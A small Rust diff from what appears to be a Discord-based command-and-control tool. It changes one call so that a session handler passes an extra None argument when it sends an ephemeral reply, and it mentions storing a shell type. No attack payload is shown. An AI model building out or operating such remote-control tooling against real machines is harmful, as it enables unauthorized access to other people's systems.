@@ -268,7 +268,7 @@ pub async fn session_handler(
     command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
     let (content, shell) = run(ctx, &command.data.options).await?;
-    send_ephemeral_response(ctx, command, &content).await?;
+    send_ephemeral_response(ctx, command, &content, None).await?;
 
     if shell.is_some() {
         // Store shell_type in the global variable
